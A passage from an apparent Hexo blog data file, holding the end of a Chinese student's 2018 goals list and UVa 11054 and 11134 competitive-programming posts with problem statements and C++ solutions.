title=\"2018值得期待的、值得完成的\"></a>2018值得期待的、值得完成的</h2><ol>\n<li>考上想去的学校</li>\n<li>完成一个有价值的开源项目</li>\n<li>参与一个企业级的项目，并贡献（主要）代码</li>\n<li>得到重量级的国际CTF比赛名次</li>\n<li>得到国内重量级CTF名次、国赛二等奖及以上</li>\n<li>获得CVE编号（中危及以上）</li>\n<li>Windows逆向与漏洞基础技能点点满</li>\n<li>实习期间能够成为合格的逆向&amp;漏洞网安从业者、达到江苏二进制顶尖水平、江苏（全国）公安内顶尖水平（V牛那个层次吧。。）</li>\n<li>熟悉Linux Kernal</li>\n<li>努力努力的学好英语QAQ（托福什么的能够拿到100吧）</li>\n<li>和SU一起努力成为国内顶尖战队、国际赛前15战队</li>\n<li>和CST成为国内一线战队（现在的SU）、有入围国内顶尖比赛并获得名次的实力</li>\n<li>每周更新博客2篇</li>\n<li>最后，还是和去年一样，希望能遇到喜欢的妹子XD</li>\n</ol>\n<p><strong>GOOD LUCK TO ME!</strong></p>\n"},{"title":"UVa 11054","date":"2017-03-22T10:43:30.000Z","_content":"\n## Description\n\n> As you may know from the comic “Asterix and the Chieftain’s Shield”, Gergovia consists of one street,\nand every inhabitant of the city is a wine salesman. You wonder how this economy works? Simple\nenough: everyone buys wine from other inhabitants of the city. Every day each inhabitant decides how\nmuch wine he wants to buy or sell. Interestingly, demand and supply is always the same, so that each\ninhabitant gets what he wants.\nThere is one problem, however: Transporting wine from one house to another results in work. Since\nall wines are equally good, the inhabitants of Gergovia don’t care which persons they are doing trade\nwith, they are only interested in selling or buying a specific amount of wine. They are clever enough\nto figure out a way of trading so that the overall amount of work needed for transports is minimized.\nIn this problem you are asked to reconstruct the trading during one day in Gergovia. For simplicity\nwe will assume that the houses are built along a straight line with equal distance between adjacent\nhouses. Transporting one bottle of wine from one house to an adjacent house results in one unit of\nwork.\nInput\nThe input consists of several test cases. Each test case starts with the number of inhabitants n\n(2 ≤ n ≤ 100000). The following line contains n integers ai (−1000 ≤ ai ≤ 1000). If ai ≥ 0, it\nmeans that the inhabitant living in the i-th house wants to buy ai bottles of wine, otherwise if ai < 0,\nhe wants to sell −ai bottles of wine. You may assume that the numbers ai sum up to 0.\nThe last test case is followed by a line containing ‘0’.\nOutput\nFor each test case print the minimum amount of work units needed so that every inhabitant has his\ndemand fulfilled. You may assume that this number fits into a signed 64-bit integer (in C/C++ you\ncan use the data type “long long”, in JAVA the data type “long”).\nSample Input\n5\n5 -4 1 -3 1\n6\n-1000 -1000 -1000 1000 1000 1000\n0\nSample Output\n9\n9000\n\n不知道为什么用`scanf`和`printf`会出问题，流就没问题。\n还发现`scanf`和流不能一起用，不然会出现奇怪的问题。\n\n## Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<string>\n#include<algorithm>\n#include<cmath>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 1e3 + 10;\n\nLL a = 0;\nLL cur;\nLL n;\n\nLL ans = 0;\n\nint main()\n{\n\tcin >> n;\n\twhile (n)\n\t{\n\t\tans = 0; a = 0;\n\t\tfor (int i = 1; i <= n; i++)\n\t\t{\n\t\t\tcin >> cur;\n\t\t\tans += abs(a);\n\t\t\ta += cur;\n\t\t}\n\t\tcout << ans << '\\n';\n\t\tcin >> n;\n\t}\n\treturn 0;\n}\n```","source":"_posts/UVa-11054.md","raw":"---\ntitle: UVa 11054\ntags:\n  - 动态规划\n  - UVa\ncategories: []\ndate: 2017-03-22 18:43:30\n---\n\n## Description\n\n> As you may know from the comic “Asterix and the Chieftain’s Shield”, Gergovia consists of one street,\nand every inhabitant of the city is a wine salesman. You wonder how this economy works? Simple\nenough: everyone buys wine from other inhabitants of the city. Every day each inhabitant decides how\nmuch wine he wants to buy or sell. Interestingly, demand and supply is always the same, so that each\ninhabitant gets what he wants.\nThere is one problem, however: Transporting wine from one house to another results in work. Since\nall wines are equally good, the inhabitants of Gergovia don’t care which persons they are doing trade\nwith, they are only interested in selling or buying a specific amount of wine. They are clever enough\nto figure out a way of trading so that the overall amount of work needed for transports is minimized.\nIn this problem you are asked to reconstruct the trading during one day in Gergovia. For simplicity\nwe will assume that the houses are built along a straight line with equal distance between adjacent\nhouses. Transporting one bottle of wine from one house to an adjacent house results in one unit of\nwork.\nInput\nThe input consists of several test cases. Each test case starts with the number of inhabitants n\n(2 ≤ n ≤ 100000). The following line contains n integers ai (−1000 ≤ ai ≤ 1000). If ai ≥ 0, it\nmeans that the inhabitant living in the i-th house wants to buy ai bottles of wine, otherwise if ai < 0,\nhe wants to sell −ai bottles of wine. You may assume that the numbers ai sum up to 0.\nThe last test case is followed by a line containing ‘0’.\nOutput\nFor each test case print the minimum amount of work units needed so that every inhabitant has his\ndemand fulfilled. You may assume that this number fits into a signed 64-bit integer (in C/C++ you\ncan use the data type “long long”, in JAVA the data type “long”).\nSample Input\n5\n5 -4 1 -3 1\n6\n-1000 -1000 -1000 1000 1000 1000\n0\nSample Output\n9\n9000\n\n不知道为什么用`scanf`和`printf`会出问题，流就没问题。\n还发现`scanf`和流不能一起用，不然会出现奇怪的问题。\n\n## Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<string>\n#include<algorithm>\n#include<cmath>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 1e3 + 10;\n\nLL a = 0;\nLL cur;\nLL n;\n\nLL ans = 0;\n\nint main()\n{\n\tcin >> n;\n\twhile (n)\n\t{\n\t\tans = 0; a = 0;\n\t\tfor (int i = 1; i <= n; i++)\n\t\t{\n\t\t\tcin >> cur;\n\t\t\tans += abs(a);\n\t\t\ta += cur;\n\t\t}\n\t\tcout << ans << '\\n';\n\t\tcin >> n;\n\t}\n\treturn 0;\n}\n```","slug":"UVa-11054","published":1,"updated":"2017-03-22T10:59:55.286Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k1y003hhv18rymmaj3t","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>As you may know from the comic “Asterix and the Chieftain’s Shield”, Gergovia consists of one street,<br>and every inhabitant of the city is a wine salesman. You wonder how this economy works? Simple<br>enough: everyone buys wine from other inhabitants of the city. Every day each inhabitant decides how<br>much wine he wants to buy or sell. Interestingly, demand and supply is always the same, so that each<br>inhabitant gets what he wants.<br>There is one problem, however: Transporting wine from one house to another results in work. Since<br>all wines are equally good, the inhabitants of Gergovia don’t care which persons they are doing trade<br>with, they are only interested in selling or buying a specific amount of wine. They are clever enough<br>to figure out a way of trading so that the overall amount of work needed for transports is minimized.<br>In this problem you are asked to reconstruct the trading during one day in Gergovia. For simplicity<br>we will assume that the houses are built along a straight line with equal distance between adjacent<br>houses. Transporting one bottle of wine from one house to an adjacent house results in one unit of<br>work.<br>Input<br>The input consists of several test cases. Each test case starts with the number of inhabitants n<br>(2 ≤ n ≤ 100000). The following line contains n integers ai (−1000 ≤ ai ≤ 1000). If ai ≥ 0, it<br>means that the inhabitant living in the i-th house wants to buy ai bottles of wine, otherwise if ai &lt; 0,<br>he wants to sell −ai bottles of wine. You may assume that the numbers ai sum up to 0.<br>The last test case is followed by a line containing ‘0’.<br>Output<br>For each test case print the minimum amount of work units needed so that every inhabitant has his<br>demand fulfilled. You may assume that this number fits into a signed 64-bit integer (in C/C++ you<br>can use the data type “long long”, in JAVA the data type “long”).<br>Sample Input<br>5<br>5 -4 1 -3 1<br>6<br>-1000 -1000 -1000 1000 1000 1000<br>0<br>Sample Output<br>9<br>9000</p>\n</blockquote>\n<p>不知道为什么用<code>scanf</code>和<code>printf</code>会出问题，流就没问题。<br>还发现<code>scanf</code>和流不能一起用，不然会出现奇怪的问题。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cmath&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">1e3</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\">LL a = <span class=\"number\">0</span>;</div><div class=\"line\">LL cur;</div><div class=\"line\">LL n;</div><div class=\"line\"></div><div class=\"line\">LL ans = <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">cin</span> &gt;&gt; n;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (n)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tans = <span class=\"number\">0</span>; a = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= n; i++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"built_in\">cin</span> &gt;&gt; cur;</div><div class=\"line\">\t\t\tans += <span class=\"built_in\">abs</span>(a);</div><div class=\"line\">\t\t\ta += cur;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; ans &lt;&lt; <span class=\"string\">'\\n'</span>;</div><div class=\"line\">\t\t<span class=\"built_in\">cin</span> &gt;&gt; n;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>As you may know from the comic “Asterix and the Chieftain’s Shield”, Gergovia consists of one street,<br>and every inhabitant of the city is a wine salesman. You wonder how this economy works? Simple<br>enough: everyone buys wine from other inhabitants of the city. Every day each inhabitant decides how<br>much wine he wants to buy or sell. Interestingly, demand and supply is always the same, so that each<br>inhabitant gets what he wants.<br>There is one problem, however: Transporting wine from one house to another results in work. Since<br>all wines are equally good, the inhabitants of Gergovia don’t care which persons they are doing trade<br>with, they are only interested in selling or buying a specific amount of wine. They are clever enough<br>to figure out a way of trading so that the overall amount of work needed for transports is minimized.<br>In this problem you are asked to reconstruct the trading during one day in Gergovia. For simplicity<br>we will assume that the houses are built along a straight line with equal distance between adjacent<br>houses. Transporting one bottle of wine from one house to an adjacent house results in one unit of<br>work.<br>Input<br>The input consists of several test cases. Each test case starts with the number of inhabitants n<br>(2 ≤ n ≤ 100000). The following line contains n integers ai (−1000 ≤ ai ≤ 1000). If ai ≥ 0, it<br>means that the inhabitant living in the i-th house wants to buy ai bottles of wine, otherwise if ai &lt; 0,<br>he wants to sell −ai bottles of wine. You may assume that the numbers ai sum up to 0.<br>The last test case is followed by a line containing ‘0’.<br>Output<br>For each test case print the minimum amount of work units needed so that every inhabitant has his<br>demand fulfilled. You may assume that this number fits into a signed 64-bit integer (in C/C++ you<br>can use the data type “long long”, in JAVA the data type “long”).<br>Sample Input<br>5<br>5 -4 1 -3 1<br>6<br>-1000 -1000 -1000 1000 1000 1000<br>0<br>Sample Output<br>9<br>9000</p>\n</blockquote>\n<p>不知道为什么用<code>scanf</code>和<code>printf</code>会出问题，流就没问题。<br>还发现<code>scanf</code>和流不能一起用，不然会出现奇怪的问题。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cmath&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">1e3</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\">LL a = <span class=\"number\">0</span>;</div><div class=\"line\">LL cur;</div><div class=\"line\">LL n;</div><div class=\"line\"></div><div class=\"line\">LL ans = <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">cin</span> &gt;&gt; n;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (n)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tans = <span class=\"number\">0</span>; a = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= n; i++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"built_in\">cin</span> &gt;&gt; cur;</div><div class=\"line\">\t\t\tans += <span class=\"built_in\">abs</span>(a);</div><div class=\"line\">\t\t\ta += cur;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; ans &lt;&lt; <span class=\"string\">'\\n'</span>;</div><div class=\"line\">\t\t<span class=\"built_in\">cin</span> &gt;&gt; n;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"UVa 11134","date":"2017-03-22T09:08:35.000Z","_content":"\n## Description\n\n> We would like to place n rooks, 1 ≤ n ≤ 5000, on a n × n\nboard subject to the following restrictions\n• The i-th rook can only be placed within the rectangle\ngiven by its left-upper corner (xli\n, yli) and its rightlower\ncorner (xri\n, yri), where 1 ≤ i ≤ n, 1 ≤ xli ≤\nxri ≤ n, 1 ≤ yli ≤ yri ≤ n.\n• No two rooks can attack each other, that is no two rooks\ncan occupy the same column or the same row.\nInput\nThe input consists of several test cases. The first line of each\nof them contains one integer number, n, the side of the board. n lines follow giving the rectangles\nwhere the rooks can be placed as described above. The i-th line among them gives xli\n, yli\n, xri\n, and\nyri\n. The input file is terminated with the integer ‘0’ on a line by itself.\nOutput\nYour task is to find such a placing of rooks that the above conditions are satisfied and then output n\nlines each giving the position of a rook in order in which their rectangles appeared in the input. If there\nare multiple solutions, any one will do. Output ‘IMPOSSIBLE’ if there is no such placing of the rooks.\nSample Input\n8\n1 1 2 2\n5 7 8 8\n2 2 5 5\n2 2 5 5\n6 3 8 6\n6 3 8 5\n6 3 8 8\n3 6 7 8\n8\n1 1 2 2\n5 7 8 8\n2 2 5 5\n2 2 5 5\n6 3 8 6\n6 3 8 5\n6 3 8 8\n3 6 7 8\n0\nSample Output\n1 1\n5 8\n2 4\n4 2\n7 3\n8 5\n6 6\n3 7\n1 1\n5 8\n2 4\n4 2\n7 3\n8 5\n6 6\n3 7\n\n简单的贪心。我的方法是给x坐标的左边排序，如果起始相同，那么按区间长度从小到大排序。然后一个一个选就好了。\n算然我的输出不同，但答案应该不止一个，我的代码逻辑上应该是对的吧。。\n不过长的真难看。。\n\n## Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<string>\n#include<algorithm>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 5000;\n\nint n;\nint flag;\nint r[maxN][4];\nint ordx[maxN];\nint ordy[maxN];\nint x[maxN][2];\nint y[maxN][2];\nint vis[maxN];\nint ans[maxN][2];\n\nbool cmpy(int a, int b)\n{\n\tif (y[a][0] < y[b][0])\n\t\treturn true;\n\telse if (y[a][0] == y[b][0])\n\t\tif (y[a][1] < y[b][1])\n\t\t\treturn true;\n\treturn false;\n}\n\nbool cmpx(int a, int b)\n{\n\tif (x[a][0] < x[b][0])\n\t\treturn true;\n\telse if (x[a][0] == x[b][0])\n\t\tif (x[a][1] < x[a][1])\n\t\t\treturn true;\n\treturn false;\n}\n\nint main()\n{\n\tscanf(\"%d\", &n);\n\twhile (n)\n\t{\n\t\tflag = 0;\n\t\tfor (int i = 0; i < n; i++)\n\t\t\tordx[i] = ordy[i] = i;\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tscanf(\"%d\", &x[i][0]);\n\t\t\tscanf(\"%d\", &y[i][0]);\n\t\t\tscanf(\"%d\", &x[i][1]);\n\t\t\tscanf(\"%d\", &y[i][1]);\n\t\t}\n\t\tsort(ordy, ordy + n, cmpy);\n\t\tsort(ordx, ordx + n, cmpx);\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\twhile (x[ordx[i]][1] - x[ordx[i]][0] >= 0)\n\t\t\t{\n\t\t\t\tif (!vis[x[ordx[i]][0]])\n\t\t\t\t{\n\t\t\t\t\tans[ordx[i]][0] = x[ordx[i]][0];\n\t\t\t\t\tvis[x[ordx[i]][0]] = 1;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t\tx[ordx[i]][0]++;\n\t\t\t}\n\t\t\tif ((x[ordx[i]][1] - x[ordx[i]][0] < 0) && (i != n - 1))\n\t\t\t{\n\t\t\t\tflag = 1;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif (!flag)\n\t\t{\n\t\t\tfor (int i = 0; i <= n; i++)\n\t\t\t\tvis[i] = 0;\n\t\t\tfor (int i = 0; i < n; i++)\n\t\t\t{\n\t\t\t\twhile (y[ordy[i]][1] - y[ordy[i]][0] >= 0)\n\t\t\t\t{\n\t\t\t\t\tif (!vis[y[ordy[i]][0]])\n\t\t\t\t\t{\n\t\t\t\t\t\tans[ordy[i]][1] = y[ordy[i]][0];\n\t\t\t\t\t\tvis[y[ordy[i]][0]] = 1;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\telse\n\t\t\t\t\t\ty[ordy[i]][0]++;\n\t\t\t\t}\n\t\t\t\tif ((y[ordy[i]][1] - y[ordy[i]][0] < 0) && (i != n - 1))\n\t\t\t\t{\n\t\t\t\t\tflag = 1;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tif (!flag)\n\t\t\tfor (int i = 0; i < n; i++)\n\t\t\t\tprintf(\"%d %d\\n\", ans[i][0], ans[i][1]);\n\t\telse\n\t\t\tprintf(\"IMPOSSIBLE\");\n\t\tscanf(\"%d\", &n);\n\t}\n\treturn 0;\n}\n```\n\n然而比大神的代码是如此简洁\n\n```\n#include <bits/stdc++.h>  \nusing namespace std;  \nconst int N = 5005;  \nint xl[N], yl[N], xr[N], yr[N], x[N], y[N], n;  \n  \nbool solve(int a[], int l[], int r[])  \n{  \n    int cur, mr;  \n    //mr为包含k的区间最小右界，cur为放k的最优区间  \n    memset(a, -1, sizeof(int)*n);  \n    for(int k = 1; k <= n; ++k)  \n    {  \n        cur = -1, mr = N;  \n        for(int i = 0; i < n; ++i)  \n            if(a[i] < 0 && l[i] <= k && r[i] < mr)  \n                mr = r[cur = i];  \n        if(cur < 0 || k > mr)  return 0;  \n        a[cur] = k;  \n    }  \n    return 1;  \n}  \n  \nint main()  \n{  \n    while(~scanf(\"%d\", &n), n)  \n    {  \n        for(int i = 0; i < n; ++i)  \n            scanf(\"%d%d%d%d\", &xl[i], &yl[i], &xr[i], &yr[i]);  \n  \n        if(solve(x, xl, xr) && solve(y, yl, yr))  \n            for(int i = 0; i < n; ++i)  \n                printf(\"%d %d\\n\", x[i], y[i]);  \n        else puts(\"IMPOSSIBLE\");  \n    }  \n    return 0;  \n}  \n```","source":"_posts/UVa-11134.md","raw":"---\ntitle: UVa 11134\ntags:\n  - 贪心\n  - UVa\ncategories: []\ndate: 2017-03-22 17:08:35\n---\n\n## Description\n\n> We would like to place n rooks, 1 ≤ n ≤ 5000, on a n × n\nboard subject to the following restrictions\n• The i-th rook can only be placed within the rectangle\ngiven by its left-upper corner (xli\n, yli) and its rightlower\ncorner (xri\n, yri), where 1 ≤ i ≤ n, 1 ≤ xli ≤\nxri ≤ n, 1 ≤ yli ≤ yri ≤ n.\n• No two rooks can attack each other, that is no two rooks\ncan occupy the same column or the same row.\nInput\nThe input consists of several test cases. The first line of each\nof them contains one integer number, n, the side of the board. n lines follow giving the rectangles\nwhere the rooks can be placed as described above. The i-th line among them gives xli\n, yli\n, xri\n, and\nyri\n. The input file is terminated with the integer ‘0’ on a line by itself.\nOutput\nYour task is to find such a placing of rooks that the above conditions are satisfied and then output n\nlines each giving the position of a rook in order in which their rectangles appeared in the input. If there\nare multiple solutions, any one will do. Output ‘IMPOSSIBLE’ if there is no such placing of the rooks.\nSample Input\n8\n1 1 2 2\n5 7 8 8\n2 2 5 5\n2 2 5 5\n6 3 8 6\n6 3 8 5\n6 3 8 8\n3 6 7 8\n8\n1 1 2 2\n5 7 8 8\n2 2 5 5\n2 2 5 5\n6 3 8 6\n6 3 8 5\n6 3 8 8\n3 6 7 8\n0\nSample Output\n1 1\n5 8\n2 4\n4 2\n7 3\n8 5\n6 6\n3 7\n1 1\n5 8\n2 4\n4 2\n7 3\n8 5\n6 6\n3 7\n\n简单的贪心。我的方法是给x坐标的左边排序，如果起始相同，那么按区间长度从小到大排序。然后一个一个选就好了。\n算然我的输出不同，但答案应该不止一个，我的代码逻辑上应该是对的吧。。\n不过长的真难看。。\n\n## Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<string>\n#include<algorithm>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 5000;\n\nint n;\nint flag;\nint r[maxN][4];\nint ordx[maxN];\nint ordy[maxN];\nint x[maxN][2];\nint y[maxN][2];\nint vis[maxN];\nint ans[maxN][2];\n\nbool cmpy(int a, int b)\n{\n\tif (y[a][0] < y[b][0])\n\t\treturn true;\n\telse if (y[a][0] == y[b][0])\n\t\tif (y[a][1] < y[b][1])\n\t\t\treturn true;\n\treturn false;\n}\n\nbool cmpx(int a, int b)\n{\n\tif (x[a][0] < x[b][0])\n\t\treturn true;\n\telse if (x[a][0] == x[b][0])\n\t\tif (x[a][1] < x[a][1])\n\t\t\treturn true;\n\treturn false;\n}\n\nint main()\n{\n\tscanf(\"%d\", &n);\n\twhile (n)\n\t{\n\t\tflag = 0;\n\t\tfor (int i = 0; i < n; i++)\n\t\t\tordx[i] = ordy[i] = i;\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tscanf(\"%d\", &x[i][0]);\n\t\t\tscanf(\"%d\", &y[i][0]);\n\t\t\tscanf(\"%d\", &x[i][1]);\n\t\t\tscanf(\"%d\", &y[i][1]);\n\t\t}\n\t\tsort(ordy, ordy + n, cmpy);\n\t\tsort(ordx, ordx + n, cmpx);\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\twhile (x[ordx[i]][1] - x[ordx[i]][0] >= 0)\n\t\t\t{\n\t\t\t\tif (!vis[x[ordx[i]][0]])\n\t\t\t\t{\n\t\t\t\t\tans[ordx[i]][0] = x[ordx[i]][0];\n\t\t\t\t\tvis[x[ordx[i]][0]] = 1;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t\tx[ordx[i]][0]++;\n\t\t\t}\n\t\t\tif ((x[ordx[i]][1] - x[ordx[i]][0] < 0) && (i != n - 1))\n\t\t\t{\n\t\t\t\tflag = 1;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif (!flag)\n\t\t{\n\t\t\tfor (int i = 0; i <= n; i++)\n\t\t\t\tvis[i] = 0;\n\t\t\tfor (int i = 0; i < n; i++)\n\t\t\t{\n\t\t\t\twhile (y[ordy[i]][1] - y[ordy[i]][0] >= 0)\n\t\t\t\t{\n\t\t\t\t\tif (!vis[y[ordy[i]][0]])\n\t\t\t\t\t{\n\t\t\t\t\t\tans[ordy[i]][1] = y[ordy[i]][0];\n\t\t\t\t\t\tvis[y[ordy[i]][0]] = 1;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\telse\n\t\t\t\t\t\ty[ordy[i]][0]++;\n\t\t\t\t}\n\t\t\t\tif ((y[ordy[i]][1] - y[ordy[i]][0] < 0) && (i != n - 1))\n\t\t\t\t{\n\t\t\t\t\tflag = 1;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tif (!flag)\n\t\t\tfor (int i = 0; i < n; i++)\n\t\t\t\tprintf(\"%d %d\\n\", ans[i][0], ans[i][1]);\n\t\telse\n\t\t\tprintf(\"IMPOSSIBLE\");\n\t\tscanf(\"%d\", &n);\n\t}\n\treturn 0;\n}\n```\n\n然而比大神的代码是如此简洁\n\n```\n#include <bits/stdc++.h>  \nusing namespace std;  \nconst int N = 5005;  \nint xl[N], yl[N], xr[N], yr[N], x[N], y[N], n;  \n  \nbool solve(int a[], int l[], int r[])  \n{  \n    int cur, mr;  \n    //mr为包含k的区间最小右界，cur为放k的最优区间  \n    memset(a, -1, sizeof(int)*n);  \n    for(int k = 1; k <= n; ++k)  \n    {  \n        cur = -1, mr = N;  \n        for(int i = 0; i < n; ++i)  \n            if(a[i] < 0 && l[i] <= k && r[i] < mr)  \n                mr = r[cur = i];  \n        if(cur < 0 || k > mr)  return 0;  \n        a[cur] = k;  \n    }  \n    return 1;  \n}  \n  \nint main()  \n{  \n    while(~scanf(\"%d\", &n), n)  \n    {  \n        for(int i = 0; i < n; ++i)  \n            scanf(\"%d%d%d%d\", &xl[i], &yl[i], &xr[i], &yr[i]);  \n  \n        if(solve(x, xl, xr) && solve(y, yl, yr))  \n            for(int i = 0; i < n; ++i)  \n                printf(\"%d %d\\n\", x[i], y[i]);  \n        else puts(\"IMPOSSIBLE\");  \n    }  \n    return 0;  \n}  \n```","slug":"UVa-11134","published":1,"updated":"2017-03-22T09:13:57.987Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k26003khv18863eb0dn","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>We would like to place n rooks, 1 ≤ n ≤ 5000, on a n × n<br>board subject to the following restrictions<br>• The i-th rook can only be placed within the rectangle<br>given by its left-upper corner (xli<br>, yli) and its rightlower<br>corner (xri<br>, yri), where 1 ≤ i ≤ n, 1 ≤ xli ≤<br>xri ≤ n, 1 ≤ yli ≤ yri ≤ n.<br>• No two rooks can attack each other, that is no two rooks<br>can occupy the same column or the same row.<br>Input<br>The input consists of several test cases. The first line of each<br>of them contains one integer number, n, the side of the board. n lines follow giving the rectangles<br>where the rooks can be placed as described above. The i-th line among them gives xli<br>, 